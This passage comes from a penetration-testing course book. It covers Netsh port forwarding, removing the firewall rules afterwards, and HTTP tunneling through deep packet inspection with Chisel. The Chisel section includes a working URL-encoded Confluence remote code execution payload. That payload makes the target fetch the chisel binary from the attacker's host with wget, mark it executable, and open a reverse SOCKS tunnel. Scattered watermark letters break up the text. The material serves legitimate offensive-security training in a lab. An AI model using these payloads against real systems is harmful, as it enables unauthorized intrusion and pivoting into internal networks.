Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:28 EDT
Nmap scan report for 192.168.50.64
Host is up (0.00060s latency).
PORT STATE SERVICE y
2222/tcp open EtherNetIP-1
MAC Address: 00:0C:29:A9:9F:3D (VMware)
k
Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
Listing 582 - Nmap showing that port 2222 ons MULTISERVER03 is open.
The port is open! We can now SSH to port 2222 on MULTISERVER03, as though connecting to
port 22 on PGDATABASE01. o
kali@kali:~$ ssh PI:EMAIL -p2222
n
The authenticity of host '[192.168.50.64]:2222 ([192.168.50.64]:2222)' can't be
established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
i
This host key is known by the following other names/addresses:
~/.ssh/known_hosts:5: [haszhed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.64]:2222' (ED25519) to the list of known
D
hosts.
PI:EMAIL's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage
System information as of Sun 21 Aug 2022 10:40:26 PM UTC
System load: 0.0 Processes: 231
Usage of /: 60.9% of 7.77GB Users logged in: 0
Memory usage: 16% IPv4 address for ens192: 10.4.50.215
Swap usage: 0% IPv4 address for ens224: 172.16.50.215
0 updates can be applied immediately.
Last login: Sat Aug 20 21:47:47 2022 from 10.4.50.63
database_admin@pgdatabase01:~$
Listing 583 - SSHing into PGDATABASE01 through the Netsh port forward.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 611
Made in Morocco
Penetration Testing with Kali Linux
Great! We’re SSH’d into PGDATABASE01 through a port forward set up on MULTISERVER03 using
Netsh.
y
k
s
Figure 260: Connecting to port 2222 on MULTISERVER03 through the hole we made in the Windows firewall
o
Once we’re done with the connection, we need to remember to delete the firewall
n
rule we just created.
i
Using netsh advfirewall firewall,z we can delete the rule, referencing it by its catchy name:
“port_forward_ssh_2222”.
D
C:\Users\Administrator>netsh advfirewall firewall delete rule
name="port_forward_ssh_2222"
Deleted 1 rule(s).
Ok.
Listing 584 - Deleting the firewall rule with Netsh.
The command completes successfully, and we receive confirmation that the firewall rule was
deleted.
We can also delete the port forward we created. This time we’ll use the netsh interface
subcontext to del the portproxy we created. We will reference the forwarding type (v4tov4) and
the listenaddress and listenport we used when creating the rule, so Netsh can determine which
rule to delete.
C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222
listenaddress=192.168.50.64
C:\Windows\Administrator>
Listing 585 - Deleting the port forwarding rule with Netsh.
When we delete the rule, we don’t get any response for a success. Nevertheless, the command
completed successfully, and the rule is deleted.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 612
Made in Morocco
Penetration Testing with Kali Linux
Most Windows Firewall commands have PowerShell equivalents with
commandlets like New-NetFirewallRule and Disable-NetFirewallRule. However,
the netsh interface portproxy command doesn’t. For simplicity, we’ve stuck with
pure Netsh commands in this section. However, for a lot of Windows Firewall
enumeration and configuration, PowerShell is extremely useful. You may wish to
experiment with it while completing the exercises for this section.
In this section, we created a port forward on Windows using the Netsh command. We also
created a firewall rule to allow inbound traffic on our listening port. We used these in conjunction
to create a working port forward from the WAN interface of MULTISERVER03 to the SSH server
of PGDATABASE01.
y
18.5 Wrapping Up
k
In this Module, we covered the concepts of port forwarding and SSH tunneling. This Module
contains tools to apply these techniques on both Windows and *NIX operating systems, which
allow us to traverse network boundaries and bypass somse common network restrictions.
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 613
Made in Morocco
Penetration Testing with Kali Linux
19 Tunneling Through Deep Packet Inspection
In this Learning Module, we will cover the following Learning Units:
• HTTP Tunneling Theory and Practice
• DNS Tunneling Theory and Practice
Deep packet inspection935 is a technology that’s implemented to monitor traffic based on a set of
rules. It’s most often used on a network perimeter, where it can highlight patterns that are
indicative of compromise.
Deep packet inspection devices may be configured to only allow specific transport protocols into,
out of, or across the network. For example, a network administrator could create a rule that
y
terminates any outbound SSH traffic. If they implemented that rule, all connections that use SSH
for transport would fail, including any SSH port redirection and tunneling strategies we had
implemented. k
Given the variety of restrictions that may be implemented on a network, we need to learn and
s
leverage a number of different tunneling tools and strategies to successfully bypass technologies
like deep packet inspection.
o
In this Module, we’ll continue from the previous Port Redirection and SSH Tunneling Module,
leveraging many concepts we introduced there. Most students should complete that Module
n
before beginning this one.
19.1 HTTP Tunneling Thieory and Practice
z
This Learning Unit covers the following Learning Objectives:
D
• Learn about HTTP tunneling
• Perform HTTP tunneling with Chisel
In this Learning Unit we will explore the concept of HTTP tunneling, as well as how to perform it
with a tool called chisel.
19.1.1 HTTP Tunneling Fundamentals
Let’s begin our exploration of HTTP tunneling by introducing a simple scenario. In this case, we
have compromised CONFLUENCE01, and can execute commands via HTTP requests. However,
once we try to pivot, we are blocked by a considerably restrictive network configuration.
Specifically, a Deep Packet Inspection (DPI) solution is now terminating all outbound traffic except
HTTP. In addition, all inbound ports on CONFLUENCE01 are blocked except TCP/8090. We can’t
rely on a normal reverse shell as it would not conform to the HTTP format and would be
terminated at the network perimeter by the DPI solution. We also can’t create an SSH remote port
forward for the same reason. The only traffic that will reach our Kali machine is HTTP, so we
could, for example, make requests with Wget and cURL.
935 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Deep_packet_inspection
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 614
Made in Morocco
Penetration Testing with Kali Linux
This is a hypothetical scenario: we haven’t actually implemented any deep packet
inspection in the exercise lab! But imagining these restrictions can help us
develop robust tunneling strategies.
The network configuration for this scenario is shown in the following diagram:
y
k
s
o
n
Figure 261: The network setup with a firewall/deep packet inspector monitoring the data stream to CONFLUENCE01 on
the WAN interface
i
In this case, the FIREWALL/INSzPECTOR device has replaced the previous simple firewall. In
addition, MULTISERVER03 is blocked on the WAN interface.
D
We have credentials for the PGDATABASE01 server, but need to figure out how to SSH directly
there through CONFLUENCE01. We need a tunnel into the internal network, but it must resemble
an outgoing HTTP connection from CONFLUENCE01.
19.1.2 HTTP Tunneling with Chisel
The above is a perfect scenario for Chisel,936 an HTTP tunneling tool that encapsulates our data
stream within HTTP. It also uses the SSH protocol within the tunnel so our data will be encrypted.
Chisel uses a client/server model. A Chisel server must be set up, which can accept a connection
from the Chisel client. Various port forwarding options are available depending on the server and
client configurations. One option that is particularly useful for us is reverse port forwarding, which
is similar to SSH remote port forwarding.
936 (Github, 2022), https://github.com/jpillora/chisel
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 615
Made in Morocco
Penetration Testing with Kali Linux
Chisel can run on macOS, Linux, and Windows, and on various architectures937
on each. Older tools like HTTPTunnel938 offer similar tunneling functionality, but
lack the flexibility and cross-platform capabilities of Chisel.
Now that we know what Chisel is capable of, we can make a plan. We will run a Chisel server on
our Kali machine, which will accept a connection from a Chisel client running on CONFLUENCE01.
Chisel will bind a SOCKS proxy port on the Kali machine. The Chisel server will encapsulate
whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted.
The Chisel client will then decapsulate it and push it wherever it is addressed. When running, it
should look somewhat like the following diagram:
y
k
s
o
n
i
z
D
Figure 262: How we intend out network setup to look once we have Chisel set up
The traffic between the Chisel client and server is all HTTP-formatted. This means we can
traverse the deep packet inspection solution regardless of the contents of each HTTP packet. The
Chisel server on our Kali machine will listen on TCP port 1080, a SOCKS proxy port. All traffic sent
to that port will be passed back up the HTTP tunnel to the Chisel client, where it will be forwarded
wherever it’s addressed.
Let’s get the Chisel server up and running on our Kali machine. In the usage guide,939 we find the --
reverse flag. Starting the Chisel server with this flag will mean that when the client connects, a
SOCKS proxy port will be bound on the server.
Before we start the server, we should copy the Chisel client binary to CONFLUENCE01. The Chisel
server and client are actually run from the same binary, they’re just initialized with either server or
client as the first argument.
937 (Github, 2022), https://github.com/jpillora/chisel/releases
938 (Sebastian Weber, 2010), http://http-tunnel.sourceforge.net/
939 (Github, 2022), https://github.com/jpillora/chisel#usage
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 616
Made in Morocco
Penetration Testing with Kali Linux
If our intended client was running a different operating system or architecture,
we would have to download the binary for that operating system and architecture
from the Chisel Github releases page.940
In this case, both CONFLUENCE01 and our Kali machine are amd64 Linux machines. That means
we can simply serve the same chisel binary we have on our Kali machine, and run it on
CONFLUENCE01. We can copy the Chisel binary to our Apache2 server’s webroot directory.
kali@kali:~$ sudo cp $(which chisel) /var/www/html/
kali@kali:~$
Listing 586 - Copying the Chisel binary to the Apache2 server folder.
We can then make sure that Apache2 is started on our Kali machine.y
kali@kali:~$ sudo systemctl start apache2
k
[sudo] password for kali:
kali@kali:~$
s
Listing 587 - Starting Apache2.
Next, we will build the wget command we’lol eventually run through our web shell on
CONFLUENCE01. This command will download the chisel binary to /tmp/chisel and make it
executable:
n
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
Listing 588 - The Wget payload we use to download the Chisel binary to /tmp/chisel on CONFLUENCE01 and make it
i
executable.
z
Next, we’ll format this command to work with our curl Confluence injection payload:
D
As before, you can modify the specific parts of the URL-encoded RCE payload
that you need to, rather than trying to build a new payload from scratch, to avoid
formatting difficulties.
kali@kali:~$ curl
http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-
O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
kali@kali:~$
Listing 589 - The Wget payload executed within our cURL Confluence injection command.
The Apache2 log file (/var/log/apache2/access.log) eventually shows the request for the chisel
binary:
940 (Github, 2022), https://github.com/jpillora/chisel/releases
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 617
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~$ tail -f /var/log/apache2/access.log
...
192.168.50.63 - - [21/Aug/2022:17:41:49 -0400] "GET /chisel HTTP/1.1" 200 8750339 "-"
"Wget/1.20.3 (linux-gnu)"
Listing 590 - The request for the chisel binary hitting our Apache2 server.
Now that we have the Chisel binary on both our Kali machine and the target, we can run them. On
the Kali machine, we’ll start the binary as a server with the server subcommand, along with the
bind port (--port) and the --reverse flag to allow the reverse port forward.
kali@kali:~$ chisel server --port 8080 --reverse
2022/07/22 16:43:23 server: Reverse tunnelling enabled
2022/07/22 16:43:23 server: Fingerprint mSEANZuBWndrvnJqRgBasGtCQqbe0TkKAnPoQJgNy7Q=
2022/07/22 16:43:23 server: Listening on http://0.0.0.0:8080
Listing 591 - Starting the Chisel server on port 8080.
y
The Chisel server starts up and confirms that it is listening on port 8080, and has reverse
tunneling enabled.
k
Before we run the Chisel client, we’ll run tcpdump on our Kali machine to log the Chisel traffic.
We’ll start the capture filtering tcp port 8080 to isolate thse Chisel traffic.
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
o
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Listing 592 - Starting tcpdump to listen on TCP/8080 through the tun0 interface.
n
Next, we’ll start the Chisel client from the web shell, applying the server address and the port
forwarding configuration options on the command line.
i
We will connect to the server running on our Kali machine (192.168.118.4:8080), creating a
z
reverse SOCKS tunnel (R:socks). The R prefix specifies a reverse tunnel using a socks proxy
(which is bound to port 1080 by default). The remaining shell redirections (> /dev/null 2>&1 &)
force the process to run in tDhe background, which will free up our shell.
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
Listing 593 - The Chisel client command we run from the web shell.
We’ll convert this into a Confluence injection payload, and send it to CONFLUENCE01.
kali@kali:~$ curl
http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
bash%27%2C%27-
c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%
7D/
kali@kali:~$
Listing 594 - Starting the Chisel client using the Confluence injection payload.
Tcpdump instantly reveals our traffic to the Chisel server, some of which is familiar.
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
18:13:53.687533 IP (tos 0x0, ttl 63, id 53760, offset 0, flags [DF], proto TCP (6),
length 276)
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 618